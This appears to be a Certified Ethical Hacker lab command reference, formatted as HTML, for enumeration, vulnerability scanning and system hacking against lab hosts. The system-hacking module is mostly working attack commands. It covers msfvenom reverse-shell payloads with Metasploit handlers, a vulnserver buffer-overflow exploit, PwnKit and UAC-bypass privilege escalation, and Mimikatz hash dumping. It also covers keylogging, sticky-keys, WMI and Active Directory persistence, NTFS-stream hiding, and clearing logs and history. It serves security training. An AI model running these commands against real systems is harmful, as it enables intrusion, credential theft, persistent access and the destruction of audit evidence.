+# OS information
+enum4linux -u martin -p apple -o 10.10.1.22
+
+# -o : OS info
+
+# Password policy
+enum4linux -u martin -p apple -P 10.10.1.22
+
+# -P : password policy
+
+# Group and member list
+enum4linux -u martin -p apple -G 10.10.1.22
+
+# -G : group/member list
+
+# Share list
+enum4linux -u martin -p apple -S 10.10.1.22
+
+# -S : sharelist</code></pre>                <p><strong>Targets, Credentials, and Consolidated Command Reference</strong> <span class="tool-tag">Reference</span></p>                <pre><code>nbtstat -a 10.10.1.11        # NetBIOS name table of remote host
+nbtstat -c                   # NetBIOS name cache
+net use                      # connections and shares
+nmap -sV -v --script nbstat.nse 10.10.1.22
+nmap -sU -p 137 --script nbstat.nse 10.10.1.22</code></pre>                <p><strong>Targets, Credentials, and Consolidated Command Reference</strong> <span class="tool-tag">Reference</span></p>                <pre><code>nmap -sU -p 161 10.10.1.22
+snmp-check 10.10.1.22
+snmpwalk -v1 -c public 10.10.1.22
+snmpwalk -v2c -c public 10.10.1.22
+nmap -sU -p 161 --script=snmp-sysdescr 10.10.1.22
+nmap -sU -p 161 --script=snmp-processes 10.10.1.22
+nmap -sU -p 161 --script=snmp-win32-software 10.10.1.22
+nmap -sU -p 161 --script=snmp-interfaces 10.10.1.22</code></pre>                <p><strong>Targets, Credentials, and Consolidated Command Reference</strong> <span class="tool-tag">Reference</span></p>                <pre><code>nmap -sU -p 389 10.10.1.22
+nmap -p 389 --script ldap-brute --script-args ldap.base=&#x27;&quot;cn=users,dc=CEH,dc=com&quot;&#x27; 10.10.1.22
+ldapsearch -h 10.10.1.22 -x -s base namingcontexts
+ldapsearch -h 10.10.1.22 -x -b &quot;DC=CEH,DC=com&quot;
+ldapsearch -x -h 10.10.1.22 -b &quot;DC=CEH,DC=com&quot; &quot;objectclass=*&quot;</code></pre>                <p><strong>Targets, Credentials, and Consolidated Command Reference</strong> <span class="tool-tag">Reference</span></p>                <pre><code>nmap -p 2049 10.10.1.19
+python3 rpc-scan.py 10.10.1.19 --rpc
+# SuperEnum: echo &quot;10.10.1.19&quot; &gt;&gt; Target.txt ; ./superenum</code></pre>                <p><strong>Targets, Credentials, and Consolidated Command Reference</strong> <span class="tool-tag">Reference</span></p>                <pre><code>dig ns www.certifiedhacker.com
+dig @ns1.bluehost.com www.certifiedhacker.com axfr
+# nslookup interactive: set querytype=soa ; certifiedhacker.com ; ls -d ns1.bluehost.com
+./dnsrecon.py -d www.certifiedhacker.com -z
+nmap --script=broadcast-dns-service-discovery certifiedhacker.com
+nmap -T4 -p 53 --script dns-brute certifiedhacker.com
+nmap --script dns-srv-enum --script-args &quot;dns-srv-enum.domain=&#x27;certifiedhacker.com&#x27;&quot;</code></pre>                <p><strong>Targets, Credentials, and Consolidated Command Reference</strong> <span class="tool-tag">Reference</span></p>                <pre><code>nmap -p 25 --script=smtp-enum-users 10.10.1.19
+nmap -p 25 --script=smtp-open-relay 10.10.1.19
+nmap -p 25 --script=smtp-commands 10.10.1.19</code></pre>                <p><strong>Targets, Credentials, and Consolidated Command Reference</strong> <span class="tool-tag">Reference</span></p>                <pre><code>nmap -p 21 10.10.1.19
+nmap -T4 -A 10.10.1.19
+nmap -p 445 -A 10.10.1.19
+nmap -p 21 -A 10.10.1.19</code></pre>                <p><strong>Targets, Credentials, and Consolidated Command Reference</strong> <span class="tool-tag">Reference</span></p>                <pre><code>enum4linux -u martin -p apple -n 10.10.1.22
+enum4linux -u martin -p apple -U 10.10.1.22
+enum4linux -u martin -p apple -o 10.10.1.22
+enum4linux -u martin -p apple -P 10.10.1.22
+enum4linux -u martin -p apple -G 10.10.1.22
+enum4linux -u martin -p apple -S 10.10.1.22</code></pre>            </div></section>            <section class="lab-task"><h3>Module 05 — Vulnerability Analysis</h3><div class="section-card">                <p><strong>Perform Vulnerability Research in Common Weakness Enumeration (CWE)</strong> <span class="tool-tag">CWE (cwe.mitre.org)</span></p>                <pre><code># Open CWE in Mozilla Firefox
+https://cwe.mitre.org/
+
+# CWE website -&gt; Search tab -&gt; Google Custom Search under &quot;Search CWE&quot;
+# Type: SMB
+# Click the search icon
+
+# Open a result link, e.g.:
+CWE-284
+
+# Navigate back: Home -&gt; CWE List
+# External Mappings section -&gt; click:
+CWE Top 25 (2021)
+
+# View &quot;Weaknesses in the 2021 CWE Top 25 Most Dangerous Software Weaknesses&quot;
+# Click individual weakness IDs for details
+                    </code></pre>                <p><strong>Perform Vulnerability Research in Common Vulnerabilities and Exposures (CVE)</strong> <span class="tool-tag">CVE (cve.mitre.org)</span></p>                <pre><code># Open CVE in Mozilla Firefox
+https://cve.mitre.org/
+
+# View &quot;Newest CVE Records&quot; / &quot;Newest CVE Entries&quot; in the right pane
+
+# Search CVE List tab -&gt; Search CVE List section:
+# Type vulnerability name and click Submit
+CVE-2021-4034
+CVE-2021-44228
+
+# Open the result link, e.g.:
+CVE-2021-44228
+
+# Search by service name:
+SMB
+# Click Submit, then click the first CVE-ID link for details
+                    </code></pre>                <p><strong>Perform Vulnerability Research in National Vulnerability Database (NVD)</strong> <span class="tool-tag">NVD (nvd.nist.gov)</span></p>                <pre><code># Open NVD in Mozilla Firefox
+https://nvd.nist.gov/
+
+# Click a CVE-ID link, e.g.:
+CVE-2022-0729
+
+# Under Severity, click:
+Base Score
+# (Common Vulnerability Scoring System Calculator)
+
+# Navigate back to main page:
+# Vulnerabilities -&gt; expand -&gt; Search &amp; Statistics
+
+# Search Vulnerability Database:
+# Keyword Search field:
+SMB
+# Click Search
+
+# Click any Vuln ID link for detailed vulnerability info
+                    </code></pre>                <p><strong>Perform Vulnerability Analysis using OpenVAS</strong> <span class="tool-tag">OpenVAS / Greenbone (Parrot 10.10.1.13 -&gt; Windows Server 2022 10.10.1.22)</span></p>                <pre><code># Host machine: Parrot Security (10.10.1.13) ; Target: Windows Server 2022 (10.10.1.22)
+
+# Parrot login
+Username: attacker
+Password: toor
+
+# Windows Server 2022 login
+User: CEH\Administrator
+Password: Pa$$w0rd
+
+# Launch OpenVAS service:
+# Applications -&gt; Pentesting -&gt; Vulnerability Analysis -&gt; Openvas - Greenbone -&gt; Start Greenbone Vulnerability Manager Service
+# [sudo] password for attacker:
+toor
+
+# Open Firefox and browse:
+https://127.0.0.1:9392
+# OpenVAS login:
+Username: admin
+Password: password
+
+# Scans -&gt; Tasks
+# (close &quot;Welcome to the scan management!&quot; pop-up if shown)
+# Hover wand icon -&gt; Task Wizard
+# IP address or hostname:
+10.10.1.22
+# Click Start Scan
+
+# Wait until Status changes Requested -&gt; Done (~20 min)
+# Click Done under Status -&gt; Report: Information
+# Click Results tab (vulnerabilities, severity, ports)
+# Click a vulnerability, e.g.:
+Report outdated /end-of-life Scan Engine /Environment (local)
+
+# Enable Windows Firewall on target:
+# Control Panel -&gt; System and Security -&gt; Windows Defender Firewall -&gt; Turn Windows Defender Firewall on or off
+# Enable Windows Firewall -&gt; OK
+
+# Return to Parrot and repeat scan Steps 9-11 (Task Wizard -&gt; 10.10.1.22 -&gt; Start Scan)
+# Wait ~15-20 min -&gt; click Done -&gt; Results tab
+
+# Disable Windows Firewall on target when finished:
+# Control Panel -&gt; System and Security -&gt; Windows Defender Firewall -&gt; Turn Windows Defender Firewall on or off
+# Disable Windows Firewall -&gt; OK
+                    </code></pre>                <p><strong>Perform Vulnerability Scanning using Nessus</strong> <span class="tool-tag">Nessus Essentials (Windows 11, https://localhost:8834/)</span></p>                <pre><code># Switch to Windows 11
+# Launch Microsoft Edge:
+https://localhost:8834/
+# If &quot;Your connection isn&#x27;t private&quot;: Advanced -&gt; continue to localhost (unsafe)
+
+# Nessus login:
+Username: Admin
+Password: password
+
+# Policies -&gt; Create a new policy -&gt; Advanced Scan
+
+# Settings -&gt; BASIC:
+Name: NetworkScan_Policy
+Description: Scanning a Network
+
+# Settings -&gt; DISCOVERY:
+# Turn off: Ping the remote host
+# Port Scanning -&gt; check: Verify open TCP ports found by local port enumerators
+
+# Settings -&gt; ADVANCED:
+# Performance Options:
+Max number of concurrent TCP sessions per host: Unlimited
+Max number of concurrent TCP sessions per scan: Unlimited
+
+# Credentials tab -&gt; Windows:
+Username: CEH123
+Password: qwerty@123
+
+# Plugins tab -&gt; (leave defaults) -&gt; Save
+# &quot;Policy saved successfully&quot;
+
+# Scans -&gt; Create a new scan
+# Scan Templates -&gt; User Defined -&gt; NetworkScan_Policy
+
+# New Scan / NetworkScan_Policy -&gt; General Settings:
+Name: Local Network
+Description: Scanning a local network
+Targets: 10.10.1.22
+
+# Schedule settings -&gt; Enabled: off
+# Drop-down next to Save -&gt; Launch
+
+# After scan completes (~15-20 min):
+# Click &quot;Local Network&quot;
+# Hosts tab: summary of target hosts, Scan Details, Vulnerabilities
+# Vulnerabilities tab: scroll all vulnerabilities
+# Example: click &quot;SSL (Multiple Issues)&quot; -&gt; click an issue, e.g. &quot;SSL Medium Strength Cipher Suites Supported (SWEET32)&quot;
+
+# Report tab -&gt; Generate Report
+# Choose file format: HTML -&gt; Generate Report
+# Open the downloaded report; click &quot;Expand All&quot;
+# Click a plugin, e.g. 42873, for details
+
+# Sign out: Admin -&gt; Sign Out
+                    </code></pre>                <p><strong>Perform Web Servers and Applications Vulnerability Scanning using CGI Scanner Nikto</strong> <span class="tool-tag">Nikto (Parrot, target https://www.certifiedhacker.com)</span></p>                <pre><code># Switch to Parrot Security
+# Applications menu -&gt; Pentesting -&gt; Web Application Analysis -&gt; Web Vulnerability Scanners -&gt; nikto
+# [sudo] password for attacker:
+toor
+
+# View available options
+nikto -H
+
+# Scan with reverse tuning (include all except specified)
+nikto -h https://www.certifiedhacker.com -Tuning x
+# -h: target host ; x: Reverse Tuning Options
+# ~10 minutes
+
+# Scan all CGI directories
+nikto -h https://www.certifiedhacker.com -Cgidirs all
+# -Cgidirs: scan specified CGI directories (&quot;none&quot; or &quot;all&quot;)
+
+# Save results to Desktop as text
+cd
+cd Desktop
+nikto -h https://www.certifiedhacker.com -o Nikto_Scan_Results -F txt
+# -o: output file name ; -F: file format
+# Name the file: Nikto_Scan_Results
+
+# Open the results file in a text editor
+pluma Nikto_Scan_Results
+                    </code></pre>            </div></section>            <section class="lab-task"><h3>Module 06 — System Hacking</h3><div class="section-card">                <p><strong>Perform Active Online Attack to Crack the System&#x27;s Password using Responder</strong> <span class="tool-tag">Responder / John the Ripper</span></p>                <pre><code># Check network interface name (eth0 may differ)
+ifconfig
+
+# Start Responder on interface
+sudo responder -I eth0
+
+# After capturing hash: escalate to root, save hash, crack
+sudo su
+pluma hash.txt
+john hash.txt
+                    </code></pre>                <p><strong>Perform Active Online Attack to Crack the System&#x27;s Password using Responder</strong> <span class="tool-tag">Responder / John the Ripper</span></p>                <pre><code># Verification: recovered plaintext password displayed by John
+john hash.txt
+                    </code></pre>                <p><strong>Audit System Passwords using L0phtCrack</strong> <span class="tool-tag">L0phtCrack 7</span></p>                <pre><code># No CLI commands; GUI wizard configuration values:
+# Host: 10.10.1.22 (Windows Server 2022)
+# Username: Administrator ; Password: Pa$$w0rd ; Domain: CEH.com (if applicable)
+# Audit type: Thorough Password Audit
+# Report: Generate Report at End of Auditing (CSV)
+# Job: Run this job immediately
+                    </code></pre>                <p><strong>Find Vulnerabilities on Exploit Sites</strong> <span class="tool-tag">Exploit-DB / VulDB / MITRE CVE / Vulners / CIRCL CVE Search</span></p>                <pre><code># Browser URLs
+https://www.exploit-db.com/
+https://vuldb.com
+https://cve.mitre.org
+https://vulners.com
+https://cve.circl.lu
+                    </code></pre>                <p><strong>Exploit Client-Side Vulnerabilities and Establish a VNC Session</strong> <span class="tool-tag">Metasploit (msfvenom / msfconsole)</span></p>                <pre><code># Root shell on attacker
+sudo su
+
+# Generate malicious executable payload
+msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -f exe LHOST=10.10.1.13 LPORT=444 -o /home/attacker/Desktop/Test.exe
+
+# Prepare shared web directory and serve payload
+mkdir /var/www/html/share
+chmod -R 755 /var/www/html/share
+chown -R www-data:www-data /var/www/html/share
+cp /home/attacker/Desktop/Test.exe /var/www/html/share
+service apache2 start
+
+# Launch Metasploit handler
+msfconsole
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST 10.10.1.13
+set LPORT 444
+exploit
+                    </code></pre>                <p><strong>Exploit Client-Side Vulnerabilities and Establish a VNC Session</strong> <span class="tool-tag">Metasploit (msfvenom / msfconsole)</span></p>                <pre><code># In Meterpreter: verify target, upload PowerUp, run checks, open VNC
+sysinfo
+upload /root/PowerSploit/Privesc/PowerUp.ps1 PowerUp.ps1
+shell
+powershell -ExecutionPolicy Bypass -Command &quot;. .\PowerUp.ps1;Invoke-AllChecks&quot;
+exit
+run vnc
+                    </code></pre>                <p><strong>Gain Access to a Remote System using Armitage</strong> <span class="tool-tag">Armitage (Metasploit GUI)</span></p>                <pre><code># Attacker root shell
+sudo su
+cd
+
+# Start DB and Apache
+service postgresql start
+service apache2 start
+
+# Copy prebuilt payload
+cp /root/Desktop/malicious_payload.exe /var/www/html/share/
+
+# (optional create share dir)
+mkdir /var/www/html/share
+chmod -R 755 /var/www/html/share
+chown -R www-data:www-data /var/www/html/share
+
+# Meterpreter verification
+sysinfo
+                    </code></pre>                <p><strong>Gain Access to a Remote System using Ninja Jonin</strong> <span class="tool-tag">Ninja Jonin</span></p>                <pre><code># Listener (Windows 11)
+Jonin-v1.1.0-win.exe   # press any key to start listener
+
+# Ninja config (constants.json)
+Name: Server22
+Host: 10.10.1.11
+
+# Jonin console commands
+list
+connect 1
+change   # Enter Type: cmd
+ipconfig
+whoami
+#help
+                    </code></pre>                <p><strong>Perform Buffer Overflow Attack to Gain Access to a Remote System</strong> <span class="tool-tag">Vulnserver + Immunity Debugger + SPIKE + Python + msfvenom + nc</span></p>                <pre><code># Connect to vulnserver and inspect commands
+nc -nv 10.10.1.11 9999
+# HELP ; EXIT
+
+# SPIKE templates
+pluma stats.spk
+# content:
+# s_readline();
+# s_string(&quot;STATS &quot;);
+# s_string_variable(&quot;0&quot;);
+generic_send_tcp 10.10.1.11 9999 stats.spk 0 0
+
+pluma trun.spk
+# content:
+# s_readline();
+# s_string(&quot;TRUN &quot;);
+# s_string_variable(&quot;0&quot;);
+generic_send_tcp 10.10.1.11 9999 trun.spk 0 0
+
+# Fuzzing
+cd /home/attacker/Desktop/Scripts/
+chmod +x fuzz.py
+./fuzz.py
+                    </code></pre>                <p><strong>Perform Buffer Overflow Attack to Gain Access to a Remote System</strong> <span class="tool-tag">Vulnserver + Immunity Debugger + SPIKE + Python + msfvenom + nc</span></p>                <pre><code># Generate pattern and find offset
+cd
+/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 11900
+pluma findoff.py
+chmod +x findoff.py
+./findoff.py
+/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 11900 -q 386F4337
+
+# Overwrite EIP check
+chmod +x overwrite.py
+./overwrite.py
+
+# Bad chars
+chmod +x badchars.py
+./badchars.py
+                    </code></pre>                <p><strong>Perform Buffer Overflow Attack to Gain Access to a Remote System</strong> <span class="tool-tag">Vulnserver + Immunity Debugger + SPIKE + Python + msfvenom + nc</span></p>                <pre><code># Find JMP ESP in essfunc.dll (Immunity)
+# !mona modules ; !mona find -s &quot;\xff\xe4&quot; -m essfunc.dll
+/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
+# JMP ESP -&gt; FFE4 ; EXIT
+
+# Jump test
+chmod +x jump.py
+./jump.py
+
+# Generate shellcode
+msfvenom -p windows/shell_reverse_tcp LHOST=10.10.1.13 LPORT=4444 EXITFUNC=thread -f c -a x86 -b &quot;\x00&quot;
+pluma shellcode.py
+chmod +x shellcode.py
+
+# Listener and exploit
+nc -nvlp 4444
+./shellcode.py
+# in shell: whoami
+                    </code></pre>                <p><strong>Escalate Privileges using Privilege Escalation Tools and Exploit Client-Side Vulnerabilities</strong> <span class="tool-tag">BeRoot / Seatbelt / Metasploit (bypassuac_fodhelper)</span></p>                <pre><code># Root shell
+sudo su
+cd
+
+# Generate payload
+msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -e x86/shikata_ga_nai -b &quot;\x00&quot; LHOST=10.10.1.13 -f exe &gt; /home/attacker/Desktop/Exploit.exe
+
+# Share &amp; serve
+ls -la /var/www/html/ | grep share
+cp /home/attacker/Desktop/Exploit.exe /var/www/html/share/
+service apache2 start
+
+# Handler
+msfconsole
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST 10.10.1.13
+exploit -j -z
+                    </code></pre>                <p><strong>Escalate Privileges using Privilege Escalation Tools and Exploit Client-Side Vulnerabilities</strong> <span class="tool-tag">BeRoot / Seatbelt / Metasploit (bypassuac_fodhelper)</span></p>                <pre><code># In Meterpreter
+sessions -i 1
+getuid
+
+# Upload BeRoot and run
+upload /home/attacker/Desktop/BeRoot/beRoot.exe
+shell
+beRoot.exe
+exit
+
+# Upload Seatbelt and run
+upload /home/attacker/Desktop/Seatbelt.exe
+shell
+Seatbelt.exe -group=system
+Seatbelt.exe -group=user
+Seatbelt.exe -group=misc
+exit
+
+# Hashdump attempt, UAC bypass, getsystem
+run post/windows/gather/smart_hashdump
+getsystem -t 1
+background
+use exploit/windows/local/bypassuac_fodhelper
+show options
+set SESSION 1
+set payload windows/meterpreter/reverse_tcp
+set LHOST 10.10.1.13
+set TARGET 0
+exploit
+getuid
+getsystem -t 1
+getuid
+run post/windows/gather/smart_hashdump
+clearev
+                    </code></pre>                <p><strong>Hack a Windows Machine using Metasploit and Perform Post-Exploitation using Meterpreter</strong> <span class="tool-tag">Metasploit / Meterpreter</span></p>                <pre><code># Payload and share
+msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -e x86/shikata_ga_nai -b &quot;\x00&quot; LHOST=10.10.1.13 -f exe &gt; /home/attacker/Desktop/Backdoor.exe
+cp /home/attacker/Desktop/Backdoor.exe /var/www/html/share/
+service apache2 start
+
+# Handler
+msfconsole
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST 10.10.1.13
+show options
+exploit -j -z
+                    </code></pre>                <p><strong>Hack a Windows Machine using Metasploit and Perform Post-Exploitation using Meterpreter</strong> <span class="tool-tag">Metasploit / Meterpreter</span></p>                <pre><code># Meterpreter enumeration and post-exploitation
+sessions -i 1
+sysinfo
+ipconfig
+getuid
+pwd
+ls
+cat Secret.txt
+
+# MACE timestamps
+timestomp Secret.txt -v
+timestomp Secret.txt -m &quot;02/11/2018 08:10:03&quot;
+timestomp Secret.txt -v
+
+# Navigation and search
+cd C:/
+pwd
+search -f pagefile.sys
+
+# Keylogging
+keyscan_start
+keyscan_dump
+idletime
+
+# Shell queries
+shell
+dir /a:h
+sc queryex type=service state=all
+netsh firewall show state
+netsh firewall show config
+wmic /node:&quot;&quot; product get name,version,vendor
+wmic cpu get
+wmic useraccount get name,sid
+wmic os where Primary=&#x27;TRUE&#x27; reboot
+                    </code></pre>                <p><strong>Escalate Privileges by Exploiting Vulnerability in pkexec</strong> <span class="tool-tag">pkexec (CVE-2021-4034 / PwnKit)</span></p>                <pre><code>whoami
+mkdir /tmp/pwnkit
+mv CVE-2021-4034 /tmp/pwnkit/
+cd /tmp
+cd pwnkit
+cd CVE-2021-4034/
+make
+./cve-2021-4034
+# in shell:
+whoami
+                    </code></pre>                <p><strong>Escalate Privileges by Bypassing UAC and Exploiting Sticky Keys</strong> <span class="tool-tag">Metasploit (bypassuac_fodhelper, sticky_keys)</span></p>                <pre><code># Generate &amp; serve payload
+sudo su
+cd
+msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=444 -f exe &gt; /home/attacker/Desktop/Windows.exe
+cp /home/attacker/Desktop/Windows.exe /var/www/html/share/
+service apache2 start
+
+# Handler
+msfconsole
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set lhost 10.10.1.13
+set lport 444
+run
+                    </code></pre>                <p><strong>Escalate Privileges by Bypassing UAC and Exploiting Sticky Keys</strong> <span class="tool-tag">Metasploit (bypassuac_fodhelper, sticky_keys)</span></p>                <pre><code># In session
+sysinfo
+getuid
+background
+use exploit/windows/local/bypassuac_fodhelper
+set session 1
+show options
+set LHOST 10.10.1.13
+set TARGET 0
+exploit
+getsystem -t 1
+getuid
+background
+
+# Sticky keys persistence
+use post/windows/manage/sticky_keys
+sessions
+set session 2
+exploit
+
+# On target lock screen: press Shift 5x, then in cmd:
+whoami
+                    </code></pre>                <p><strong>Escalate Privileges to Gather Hashdump using Mimikatz</strong> <span class="tool-tag">Metasploit / Kiwi (Mimikatz)</span></p>                <pre><code># Generate &amp; serve
+sudo su
+cd
+msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=444 -f exe &gt; /home/attacker/Desktop/backdoor.exe
+cp /home/attacker/Desktop/backdoor.exe /var/www/html/share/
+service apache2 start
+
+# Handler
+msfconsole
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set lhost 10.10.1.13
+set lport 444
+run
+                    </code></pre>                <p><strong>Escalate Privileges to Gather Hashdump using Mimikatz</strong> <span class="tool-tag">Metasploit / Kiwi (Mimikatz)</span></p>                <pre><code># Session
+sysinfo
+getuid
+background
+use exploit/windows/local/bypassuac_fodhelper
+set session 1
+show options
+set LHOST 10.10.1.13
+set TARGET 0
+exploit
+getsystem -t 1
+getuid
+
+# Kiwi/Mimikatz
+load kiwi
+help kiwi
+lsa_dump_sam
+lsa_dump_secrets
+password_change -u Admin -n 92937945b518814341de3f726500d4ff -P password
+lsa_dump_sam
+                    </code></pre>                <p><strong>User System Monitoring and Surveillance using Power Spy</strong> <span class="tool-tag">Power Spy / RDP</span></p>                <pre><code># RDP connection
+# Windows Server 2022 -&gt; Remote Desktop Connection
+# Computer: 10.10.1.19 ; User: Jason ; Password: qwerty
+
+# Power Spy hotkey to unhide: Ctrl+Alt+X
+# Power Spy password: test@123
+                    </code></pre>                <p><strong>User System Monitoring and Surveillance using Spytech SpyAgent</strong> <span class="tool-tag">Spytech SpyAgent / RDP</span></p>                <pre><code># RDP: Computer 10.10.1.19 ; User Jason ; Password qwerty
+
+# SpyAgent setup password: spytech
+# SpyAgent access password: test@123
+# Unhide hotkey: Ctrl+Shift+Alt+M
+                    </code></pre>                <p><strong>Hide Files using NTFS Streams</strong> <span class="tool-tag">NTFS Alternate Data Streams</span></p>                <pre><code>cd C:\magic
+notepad readme.txt
+# type HELLO WORLD!! ; save
+
+dir
+type c:\magic\calc.exe &gt; c:\magic\readme.txt:calc.exe
+dir
+# delete calc.exe from C:\magic
+mklink backdoor.exe readme.txt:calc.exe
+backdoor.exe
+                    </code></pre>                <p><strong>Hide Data using White Space Steganography</strong> <span class="tool-tag">Snow (whitespace steganography)</span></p>                <pre><code>cd C:\Users\Admin\Desktop\Snow
+snow -C -m &quot;My swiss bank account number is 45656684512263&quot; -p &quot;magic&quot; readme.txt readme2.txt
+snow -C -p &quot;magic&quot; readme2.txt
+                    </code></pre>                <p><strong>Image Steganography using OpenStego and StegOnline</strong> <span class="tool-tag">OpenStego / StegOnline</span></p>                <pre><code># OpenStego (GUI)
+# Message File: New Text Document.txt
+# Cover File: Island.jpg
+# Output: Desktop/Stego.bmp
+# Hide Data -&gt; OK
+# Extract Data: Input Stego.bmp -&gt; Output folder Desktop -&gt; Extract Data
+
+# StegOnline
+https://stegonline.georgeom.net/upload
+# Upload Island.jpg -&gt; Embed Files/Data
+# check row 5 columns R,G,B -&gt; Input Data Text &quot;Hello World!!!&quot; -&gt; Go -&gt; Download
+# Extract: upload stego image -&gt; Extract Files/Data -&gt; row5 RGB -&gt; Go -&gt; view Results
+                    </code></pre>                <p><strong>Maintain Persistence by Abusing Boot or Logon Autostart Execution</strong> <span class="tool-tag">Metasploit / Startup folder</span></p>                <pre><code># Generate
+sudo su
+cd
+msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=444 -f exe &gt; /home/attacker/Desktop/exploit.exe
+cp /home/attacker/Desktop/exploit.exe /var/www/html/share/
+service apache2 start
+
+# Handler
+msfconsole
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set lhost 10.10.1.13
+set lport 444
+run
+                    </code></pre>                <p><strong>Maintain Persistence by Abusing Boot or Logon Autostart Execution</strong> <span class="tool-tag">Metasploit / Startup folder</span></p>                <pre><code># In session
+getuid
+background
+use exploit/windows/local/bypassuac_fodhelper
+set session 1
+set LHOST 10.10.1.13
+set TARGET 0
+exploit
+getsystem -t 1
+getuid
+
+# Startup folder persistence
+cd &quot;C:\\ProgramData\\Start Menu\\Programs\\Startup&quot;
+pwd
+# new terminal:
+msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=8080 -f exe &gt; payload.exe
+upload /home/attacker/payload.exe
+
+# Handler for reboot
+msfconsole
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set lhost 10.10.1.13
+set lport 8080
+exploit
+getuid
+                    </code></pre>                <p><strong>Maintain Domain Persistence by Exploiting Active Directory Objects</strong> <span class="tool-tag">Metasploit / PowerView / AdminSDHolder</span></p>                <pre><code># Generate &amp; serve
+sudo su
+cd
+msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=444 -f exe &gt; /home/attacker/Desktop/Exploit.exe
+cp /home/attacker/Desktop/Exploit.exe /var/www/html/share/
+service apache2 start
+
+# Handler
+msfconsole
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set lhost 10.10.1.13
+set lport 444
+run
+                    </code></pre>                <p><strong>Maintain Domain Persistence by Exploiting Active Directory Objects</strong> <span class="tool-tag">Metasploit / PowerView / AdminSDHolder</span></p>                <pre><code># In session
+getuid
+upload -r /home/attacker/PowerTools-master C:\\Users\\Administrator\\Downloads
+shell
+cd C:\Windows\System32
+powershell
+cd C:\Users\Administrator\Downloads\PowerView
+Import-Module ./powerview.psm1
+Add-ObjectAcl -TargetADSprefix &#x27;CN=AdminSDHolder,CN=System&#x27; -PrincipalSamAccountName Martin -Verbose -Rights All
+Get-ObjectAcl -SamAccountName &quot;Martin&quot; -ResolveGUIDs
+REG ADD HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters /V AdminSDProtectFrequency /T REG_DWORD /F /D 300
+
+# Add Martin to Domain Admins
+net group &quot;Domain Admins&quot; Martin /add /domain
+
+# Verify access
+dir \\10.10.1.22\C$
+                    </code></pre>                <p><strong>Privilege Escalation and Maintain Persistence using WMI</strong> <span class="tool-tag">Metasploit / WMI-Persistence</span></p>                <pre><code># Generate payloads
+sudo su
+cd
+msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=444 -f exe &gt; /home/attacker/Desktop/Payload.exe
+msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=444 -f exe &gt; /home/attacker/Desktop/wmi.exe
+cp /home/attacker/Desktop/Payload.exe /var/www/html/share/
+cp /home/attacker/Desktop/wmi.exe /var/www/html/share/
+service apache2 start
+
+# Handler
+msfconsole
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set lhost 10.10.1.13
+set lport 444
+run
+                    </code></pre>                <p><strong>Privilege Escalation and Maintain Persistence using WMI</strong> <span class="tool-tag">Metasploit / WMI-Persistence</span></p>                <pre><code># In session
+getuid
+upload /home/attacker/Wmi-Persistence-master C:\\Users\\Administrator\\Downloads
+load powershell
+powershell_shell
+Import-Module ./WMI-Persistence.ps1
+# if error: Import-Module &quot;C:\Users\Administrator\Downloads\WMI-Persistence.ps1&quot;
+Install-Persistence -Trigger Startup -Payload &quot;C:\Users\Administrator\Downloads\wmi.exe&quot;
+
+# Exit PS
+# Ctrl+C then y
+
+# Second handler
+msfconsole
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set lhost 10.10.1.13
+set lport 444
+run
+# after reboot: getuid
+                    </code></pre>                <p><strong>Covert Channels using Covert_TCP</strong> <span class="tool-tag">Covert_TCP / tcpdump / Wireshark</span></p>                <pre><code># Parrot (sender)
+cd Desktop
+mkdir Send
+cd Send
+echo &quot;Secret Message&quot; &gt; message.txt
+# copy covert_tcp.c from CEH-Tools share into Send
+cc -o covert_tcp covert_tcp.c
+
+# Receiver (Ubuntu)
+sudo su
+tcpdump -nvvx port 8888 -i lo
+# new tab:
+cd Desktop
+mkdir Receive
+cd Receive
+# copy covert_tcp.c, then:
+cc -o covert_tcp covert_tcp.c
+sudo su
+./covert_tcp -dest 10.10.1.9 -source 10.10.1.13 -source_port 9999 -dest_port 8888 -server -file /home/ubuntu/Desktop/Receive/receive.txt
+
+# Send (Parrot)
+sudo su
+./covert_tcp -dest 10.10.1.9 -source 10.10.1.13 -source_port 8888 -dest_port 9999 -file /home/attacker/Desktop/Send/message.txt
+
+# Wireshark filter
+tcp
+                    </code></pre>                <p><strong>View, Enable, and Clear Audit Policies using Auditpol</strong> <span class="tool-tag">auditpol.exe</span></p>                <pre><code>auditpol /get /category:*
+auditpol /set /category:&quot;system&quot;,&quot;account logon&quot; /success:enable /failure:enable
+auditpol /get /category:*
+auditpol /clear /y
+auditpol /get /category:*
+                    </code></pre>                <p><strong>Clear Windows Machine Logs using Various Utilities</strong> <span class="tool-tag">Clear_Event_Viewer_Logs.bat / wevtutil / Cipher</span></p>                <pre><code># Run as admin
+# E:\CEH-Tools\...\Clear_Event_Viewer_Logs.bat (Run as administrator)
+
+# Elevated cmd:
+wevtutil el
+wevtutil cl system
+# also: wevtutil cl application ; wevtutil cl security
+
+cipher /w:C:
+# Ctrl+C to stop
+                    </code></pre>                <p><strong>Clear Linux Machine Logs using the BASH Shell</strong> <span class="tool-tag">BASH history / shred</span></p>                <pre><code>export HISTSIZE=0
+history -c
+history -w
+shred ~/.bash_history
+more ~/.bash_history
